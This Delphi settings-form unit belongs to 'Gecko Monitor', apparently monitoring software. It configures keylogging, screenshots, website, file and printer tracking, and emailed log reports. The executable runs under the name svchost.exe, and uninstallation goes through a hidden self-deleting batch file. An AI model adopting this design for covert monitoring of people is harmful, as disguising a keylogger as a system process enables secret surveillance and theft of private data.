unit uSettingsForm;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, FormSize, cxGraphics, cxControls,
  cxLookAndFeels, cxLookAndFeelPainters, dxSkinsCore, dxSkinMoneyTwins,
  AdvSmoothListBox, Vcl.ExtCtrls, Vcl.StdCtrls, AdvPanel, Vcl.Menus, cxButtons,
  dxSkinscxPCPainter, cxPCdxBarPopupMenu, Vcl.ImgList, dxSkinVS2010,
  cxContainer, cxEdit, cxStyles, cxCustomData, cxFilter, cxData, cxDataStorage,
  cxTextEdit, cxCheckListBox, cxGridLevel, cxGridCustomTableView,
  cxGridTableView, cxGridBandedTableView, cxClasses, cxGridCustomView, cxGrid,
  cxRadioGroup, cxMaskEdit, cxSpinEdit, cxGroupBox, Vcl.ComCtrls, cxCheckBox,
  cxLabel, cxPC, cxDropDownEdit, OverbyteIcsSmtpProt;

type
  TfrmSettings = class(TForm)
    lbSettingsPicker: TAdvSmoothListBox;
    paSettingsPicker: TPanel;
    paSettings: TPanel;
    paInSettings: TAdvPanel;
    paBottom: TPanel;
    btCancel: TcxButton;
    btOk: TcxButton;
    PageControl: TcxPageControl;
    tabScreenshots: TcxTabSheet;
    tabKeylogger: TcxTabSheet;
    tabWebsites: TcxTabSheet;
    tabFiles: TcxTabSheet;
    tabPrinters: TcxTabSheet;
    shHeader2: TShape;
    lbheader2: TcxLabel;
    tabGeneral: TcxTabSheet;
    shHeader1: TShape;
    lbHeader1: TcxLabel;
    chbStartWindows: TcxCheckBox;
    gbScreenshotInterval: TcxGroupBox;
    chbScreenshotEvery: TcxCheckBox;
    seScreenshotInterval: TcxSpinEdit;
    lbScreenshotSeconds: TcxLabel;
    rbScrScreen: TcxRadioButton;
    rbScrActive: TcxRadioButton;
    gbScreenshotFocused: TcxGroupBox;
    chbScreenshotFocused: TcxCheckBox;
    rbScrFocScreen: TcxRadioButton;
    rbScrFocActive: TcxRadioButton;
    lbHotkeyShowApp: TcxLabel;
    chbAutoMonitor: TcxCheckBox;
    lbHeader3: TcxLabel;
    shHeader3: TShape;
    chbBackspaceEmulate: TcxCheckBox;
    lbHeader4: TcxLabel;
    shHeader4: TShape;
    gridIgnoreSites: TcxGrid;
    gridIgnoreSitesTable: TcxGridBandedTableView;
    gridKeyloggerApp: TcxGridBandedColumn;
    gridIgnoreSitesLevel: TcxGridLevel;
    btSiteIgnoreAdd: TcxButton;
    btSiteIgnoreDelete: TcxButton;
    lbHeaderDescription4: TcxLabel;
    lbHeader5: TcxLabel;
    shHeader5: TShape;
    lboxMonitoredPrinters: TcxCheckListBox;
    lbSpoolNotRunning: TcxLabel;
    btUninstall: TcxButton;
    lbHeader6: TcxLabel;
    shheader6: TShape;
    chbReportMail: TcxCheckBox;
    lbReportRecp: TcxLabel;
    teReportRecp: TcxTextEdit;
    lbSMTPUser: TcxLabel;
    teSMTPUsername: TcxTextEdit;
    lbReportSubject: TcxLabel;
    teReportSubject: TcxTextEdit;
    lbSMTPServer: TcxLabel;
    teSMTPServer: TcxTextEdit;
    teSMTPPassword: TcxTextEdit;
    lbSMTPPass: TcxLabel;
    lbSMTPPort: TcxLabel;
    seSMTPPort: TcxSpinEdit;
    lbReportInterval: TcxLabel;
    chbReportResetLogs: TcxCheckBox;
    seReportInterval: TcxSpinEdit;
    lbReportIntervalMins: TcxLabel;
    btReportTest: TcxButton;
    cbSSLType: TcxComboBox;
    cxLabel1: TcxLabel;
    lbHeader7: TcxLabel;
    lbHeaderDescription7: TcxLabel;
    shHeader7: TShape;
    btFilesIgnoreAdd: TcxButton;
    btFilesIgnoreDel: TcxButton;
    gridFilesIgnore: TcxGrid;
    gridFilesIgnoreTable: TcxGridBandedTableView;
    gridFilesIgnoreMask: TcxGridBandedColumn;
    gridFilesIgnoreLevel: TcxGridLevel;
    btMailHelp: TcxButton;
    btChangePassword: TcxButton;
    hkShowHide: THotKey;
    chbGeckoTray: TcxCheckBox;
    cbElevateGecko: TcxCheckBox;
    lbAdminUsername: TcxLabel;
    teAdminUsername: TcxTextEdit;
    teAdminPassword: TcxTextEdit;
    lbAdminPassword: TcxLabel;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure lbSettingsPickerItemChanged(Sender: TObject; itemindex: Integer);
    procedure FormCreate(Sender: TObject);
    procedure btSiteIgnoreDeleteClick(Sender: TObject);
    procedure btSiteIgnoreAddClick(Sender: TObject);
    procedure tabWebsitesShow(Sender: TObject);
    procedure tabPrintersShow(Sender: TObject);
    procedure btUninstallClick(Sender: TObject);
    procedure btReportTestClick(Sender: TObject);
    procedure btFilesIgnoreAddClick(Sender: TObject);
    procedure btFilesIgnoreDelClick(Sender: TObject);
    procedure tabFilesShow(Sender: TObject);
    procedure btMailHelpClick(Sender: TObject);
    procedure btChangePasswordClick(Sender: TObject);
    procedure cbElevateGeckoPropertiesChange(Sender: TObject);
  private
    procedure ConfigureForm;
    procedure LoadSettings;
    procedure UpdateWebsiteIgnoreList;
    procedure UpdateFileIgnoreList;
    procedure UpdateMonitoredPrintersList;
  public
    class function RunModal: Integer;
  end;

var
  frmSettings: TfrmSettings;

implementation

{$R *.dfm}

uses
  {$IFDEF DEBUG} JclDebug, {$ENDIF}
  Printers,
  uCommon, uResources, uDataModel, uIgnoreItemAdd, uStartup,
  uChangePasswordForm, uMainForm;

class function TfrmSettings.RunModal: Integer;
var
  C1: Integer;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  if not Assigned(frmSettings) then
  begin
    Application.CreateForm(TfrmSettings, frmSettings);
    result := frmSettings.ShowModal;
    case result of
      mrOk : begin
               DataModel.Settings.General.StartWithWindows := frmSettings.chbStartWindows.Checked;
               DataModel.Settings.General.AutoStartMonitor := frmSettings.chbAutoMonitor.Checked;
               DataModel.Settings.General.ShowHideHotkey := frmSettings.hkShowHide.HotKey;
               DataModel.Settings.General.GeckoTray := frmSettings.chbGeckoTray.Checked;
               DataModel.Settings.General.Elevate := frmSettings.cbElevateGecko.Checked;
               DataModel.Settings.General.AdminUsername := TShortString(frmSettings.teAdminUsername.Text);
               DataModel.Settings.General.AdminPassword := TShortString(frmSettings.teAdminPassword.Text);

               DataModel.Settings.Report.ReportMail := frmSettings.chbReportMail.Checked;
               DataModel.Settings.Report.ResetLogs := frmSettings.chbReportResetLogs.Checked;
               DataModel.Settings.Report.ReportRecip := TShortString(frmSettings.teReportRecp.Text);
               DataModel.Settings.Report.ReportSubject := TShortString(frmSettings.teReportSubject.Text);
               DataModel.Settings.Report.ReportInterval := frmSettings.seReportInterval.Value;
               DataModel.Settings.Report.SMTPServer := TShortString(frmSettings.teSMTPServer.Text);
               DataModel.Settings.Report.SMTPPort := frmSettings.seSMTPPort.Value;
               DataModel.Settings.Report.SMTPUsername := TShortString(frmSettings.teSMTPUsername.Text);
               DataModel.Settings.Report.SMTPPassword := TShortString(frmSettings.teSMTPPassword.Text);
               DataModel.Settings.Report.SSLType := frmSettings.cbSSLType.ItemIndex;

               DataModel.Settings.Screenshots.ScreenshotOnInterval.Enabled := frmSettings.chbScreenshotEvery.Checked;
               DataModel.Settings.Screenshots.ScreenshotOnInterval.Interval := frmSettings.seScreenshotInterval.Value;
               if frmSettings.rbScrActive.Checked then
                 DataModel.Settings.Screenshots.ScreenshotOnInterval.ScrType := 2
               else
                 DataModel.Settings.Screenshots.ScreenshotOnInterval.ScrType := 1;

               DataModel.Settings.Screenshots.ScreenshotOnFocus.Enabled := frmSettings.chbScreenshotFocused.Checked;
               if frmSettings.rbScrFocActive.Checked then
                 DataModel.Settings.Screenshots.ScreenshotOnFocus.ScrType := 2
               else
                 DataModel.Settings.Screenshots.ScreenshotOnFocus.ScrType := 1;

               DataModel.Settings.Keylogger.EmulateBackspace := frmSettings.chbBackspaceEmulate.Checked;

               DataModel.SettingsDynamic.Printers.Monitored.Items.Clear;
               for C1 := 0 to frmSettings.lboxMonitoredPrinters.Count - 1 do
                 if frmSettings.lboxMonitoredPrinters.Items[C1].Checked then
                   DataModel.SettingsDynamic.Printers.Monitored.Items.Add(frmSettings.lboxMonitoredPrinters.Items[C1].Text);
             end;
    end;
    FreeAndNil(frmSettings);
  end
  else
    result := -1;
end;

procedure TfrmSettings.tabFilesShow(Sender: TObject);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  UpdateFileIgnoreList;
end;

procedure TfrmSettings.tabPrintersShow(Sender: TObject);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  UpdateMonitoredPrintersList;
end;

procedure TfrmSettings.tabWebsitesShow(Sender: TObject);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  UpdateWebsiteIgnoreList;
end;

procedure TfrmSettings.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  Action := caHide;
end;

procedure TfrmSettings.FormCreate(Sender: TObject);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  ConfigureForm;
  LoadSettings;
end;

procedure TfrmSettings.btChangePasswordClick(Sender: TObject);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  if TfrmChangePassword.RunModal = mrOk then
    DataModel.SaveSettings;
end;

procedure TfrmSettings.btFilesIgnoreAddClick(Sender: TObject);
var
  item: String;
  res : Integer;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  res := TfrmIgnoreItemAdd.RunModal(item);
  if res <> -1 then
  begin
    if res = mrOk then
      DataModel.AddFileToIgnoreList(item);
    FreeAndNil(frmIgnoreItemAdd);
  end;

  UpdateFileIgnoreList;
end;

procedure TfrmSettings.btFilesIgnoreDelClick(Sender: TObject);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  DataModel.DeleteFileIgnoreItem(gridFilesIgnoreTable.DataController.FocusedRecordIndex);
  UpdateFileIgnoreList;
end;

procedure TfrmSettings.btMailHelpClick(Sender: TObject);
begin
  ShellOpen('http://www.geckomonitor.com/email-report-guide.html');
end;

procedure TfrmSettings.btReportTestClick(Sender: TObject);
var
  sslType: TSmtpSslType;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  case cbSSLType.ItemIndex of
    0: sslType := smtpTlsNone;
    1: sslType := smtpTlsImplicit;
    2: sslType := smtpTlsExplicit;
  else
    sslType := smtpTlsNone;
  end;

  DataModel.Mailer.Send(teReportRecp.Text, teReportSubject.Text, '', teSMTPServer.Text, IntToStr(seSMTPPort.Value), teSMTPUsername.Text, teSMTPPassword.Text, sslType);
  MessageDlg('Test E-Mail sent, please check your inbox && junk folder.', mtInformation, [mbOk], 0);
end;

procedure TfrmSettings.btSiteIgnoreAddClick(Sender: TObject);
var
  item: String;
  res : Integer;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  res := TfrmIgnoreItemAdd.RunModal(item);
  if res <> -1 then
  begin
    if res = mrOk then
      DataModel.AddWebsiteToIgnoreList(item);
    FreeAndNil(frmIgnoreItemAdd);
  end;

  UpdateWebsiteIgnoreList;
end;

procedure TfrmSettings.btSiteIgnoreDeleteClick(Sender: TObject);
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  DataModel.DeleteWebIgnoreItem(gridIgnoreSitesTable.DataController.FocusedRecordIndex);
  UpdateWebsiteIgnoreList;
end;

procedure TfrmSettings.btUninstallClick(Sender: TObject);
var
  batchFile: String;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  if MessageDlg('Warning! This will uninstall Gecko Monitor. Are you sure you want to proceed?', mtWarning, [mbYes, mbNo], 0) = mrYes then
  begin
    TStartup.Uninstall;

    batchFile := DataModel.SelfPath + 'uninstall.bat';
    Log(batchFile, 'PING 1.1.1.1 -n 1 -w 1000'); // 1 sec delay before we start uninstalling
    Log(batchFile, ':PROCESS_CHECK'); // loop while Gecko process is still running
    Log(batchFile, Format('TASKLIST /FI "PID eq %d" 2>nul | find /I /N "svchost.exe">nul', [GetCurrentProcessId]));
    Log(batchFile, 'IF "%ERRORLEVEL%"=="0" GOTO PROCESS_CHECK');
    Log(batchFile, Format('DEL "%s"', [DataModel.SettingsFile]));
    Log(batchFile, Format('DEL "%s"', [DataModel.SelfPath + 'svchost.exe']));
    Log(batchFile, Format('DEL "%s"', [DataModel.SelfPath + 'libeay32.dll']));
    Log(batchFile, Format('DEL "%s"', [DataModel.SelfPath + 'ssleay32.dll']));
    Log(batchFile, Format('DEL "%s"', [batchFile]));

    ShellOpen(batchFile, nil, nil, SW_HIDE);

    frmMain.CloseGecko(FALSE);
  end;
end;

procedure TfrmSettings.cbElevateGeckoPropertiesChange(Sender: TObject);
begin
  teAdminUsername.Enabled := cbElevateGecko.Checked;
  teAdminPassword.Enabled := cbElevateGecko.Checked;
end;

procedure TfrmSettings.ConfigureForm;
//
// Configure form elements
//
var
  C1          : Integer;
  headerShape : TShape;
  cxlabel     : TcxLabel;
  cxlabel1    : TcxLabel;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  // set active page
  PageControl.ActivePageIndex := 0;

  // we must position buttons manually, otherwise their position is fucked up
  // I have no idea why, maybe FormSize component is conflicting with something
  btCancel.Left := paBottom.Width - btCancel.Width - 12;
  btOK.Left := btCancel.Left - btOK.Width - 10;

  // enumerate all sbHeader and lbHeader components and position them
  // these are headers in setting panels
  C1 := 1;
  while TRUE do
  begin
    headerShape := (FindComponent(Format('shHeader%d', [C1])) as TShape);
    cxlabel := (FindComponent(Format('lbHeader%d', [C1])) as TcxLabel);
    cxlabel1 := (FindComponent(Format('lbHeaderDescription%d', [C1])) as TcxLabel);

    if (not Assigned(headerShape)) or
       (not Assigned(cxlabel)) then
      Break;

    headerShape.Left := 10;
    headerShape.Width := headerShape.Parent.Width - headerShape.Left * 2;
    cxlabel.Left := headerShape.Left + 10;
    cxlabel.Top := headerShape.Top + headerShape.Height div 2 - cxlabel.Height div 2 - 1;

    if Assigned(cxlabel1) then
    begin
      cxlabel1.Left := cxlabel.Left + cxlabel.Width + 5;
      cxlabel1.Top := cxlabel.Top;
    end;

    Inc(C1);
  end;
end;

procedure TfrmSettings.lbSettingsPickerItemChanged(Sender: TObject; itemindex: Integer);
//
// When new item is selected in settings picker, change page control to
// appropriate page
//
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  PageControl.ActivePageIndex := itemindex;
end;

procedure TfrmSettings.LoadSettings;
//
// Adjust controls state according to settings
//
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  chbStartWindows.Checked := DataModel.Settings.General.StartWithWindows;
  chbAutoMonitor.Checked := DataModel.Settings.General.AutoStartMonitor;
  hkShowHide.HotKey := DataModel.Settings.General.ShowHideHotkey;
  chbGeckoTray.Checked := DataModel.Settings.General.GeckoTray;
  cbElevateGecko.Checked := DataModel.Settings.General.Elevate;
  teAdminUsername.Text := String(DataModel.Settings.General.AdminUsername);
  teAdminPassword.Text := String(DataModel.Settings.General.AdminPassword);
  cbElevateGecko.Properties.OnChange(nil);

  chbReportMail.Checked := DataModel.Settings.Report.ReportMail;
  chbReportResetLogs.Checked := DataModel.Settings.Report.ResetLogs;;
  teReportRecp.Text := String(DataModel.Settings.Report.ReportRecip);
  teReportSubject.Text := String(DataModel.Settings.Report.ReportSubject);
  seReportInterval.Value := DataModel.Settings.Report.ReportInterval;
  teSMTPServer.Text := String(DataModel.Settings.Report.SMTPServer);
  seSMTPPort.Value := DataModel.Settings.Report.SMTPPort;
  teSMTPUsername.Text := String(DataModel.Settings.Report.SMTPUsername);
  teSMTPPassword.Text := String(DataModel.Settings.Report.SMTPPassword);
  cbSSLType.ItemIndex := DataModel.Settings.Report.SSLType;

  chbScreenshotEvery.Checked := DataModel.Settings.Screenshots.ScreenshotOnInterval.Enabled;
  seScreenshotInterval.Value := DataModel.Settings.Screenshots.ScreenshotOnInterval.Interval;
  rbScrScreen.Checked := TRUE;
  rbScrActive.Checked := DataModel.Settings.Screenshots.ScreenshotOnInterval.ScrType = 2;

  chbScreenshotFocused.Checked := DataModel.Settings.Screenshots.ScreenshotOnFocus.Enabled;
  rbScrFocScreen.Checked := TRUE;
  rbScrFocActive.Checked := DataModel.Settings.Screenshots.ScreenshotOnFocus.ScrType = 2;

  chbBackspaceEmulate.Checked := DataModel.Settings.Keylogger.EmulateBackspace;

  UpdateWebsiteIgnoreList;
  UpdateFileIgnoreList;
  UpdateMonitoredPrintersList;
end;

procedure TfrmSettings.UpdateWebsiteIgnoreList;
//
// Fills website ignore grid with items
//
var
  C1 : Integer;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  gridIgnoreSitesTable.DataController.BeginFullUpdate;
  try
    gridIgnoreSitesTable.DataController.RecordCount := DataModel.SettingsDynamic.Websites.IgnoreList.Items.Count;
    for C1 := 0 to DataModel.Settings.Websites.IgnoreList.Count - 1 do
      gridIgnoreSitesTable.DataController.SetValue(C1, 0, DataModel.SettingsDynamic.Websites.IgnoreList.Items[C1]);
  finally
    gridIgnoreSitesTable.DataController.EndFullUpdate;
  end;
end;

procedure TfrmSettings.UpdateFileIgnoreList;
//
// Fills file ignore grid with items
//
var
  C1 : Integer;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  gridFilesIgnoreTable.DataController.BeginFullUpdate;
  try
    gridFilesIgnoreTable.DataController.RecordCount := DataModel.SettingsDynamic.Files.IgnoreList.Items.Count;
    for C1 := 0 to DataModel.Settings.Files.IgnoreList.Count - 1 do
      gridFilesIgnoreTable.DataController.SetValue(C1, 0, DataModel.SettingsDynamic.Files.IgnoreList.Items[C1]);
  finally
    gridFilesIgnoreTable.DataController.EndFullUpdate;
  end;
end;

procedure TfrmSettings.UpdateMonitoredPrintersList;
//
// Fills monitored printers list with items
//
var
  C1  : Integer;
  C2  : Integer;
  item: TcxCheckListBoxItem;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  lboxMonitoredPrinters.Clear;
  if DataModel.IsSpoolerRunning then
  begin
    lbSpoolNotRunning.Visible := FALSE;
    for C1 := 0 to Printer.Printers.Count - 1 do
    begin
      item := lboxMonitoredPrinters.Items.Add;
      item.Text := Printer.Printers[C1];

      for C2 := 0 to DataModel.SettingsDynamic.Printers.Monitored.Items.Count - 1 do
        if item.Text = DataModel.SettingsDynamic.Printers.Monitored.Items[C2] then
        begin
          item.Checked := TRUE;
          Break;
        end;
    end;
  end
  else
    lbSpoolNotRunning.Visible := TRUE;
end;

end.
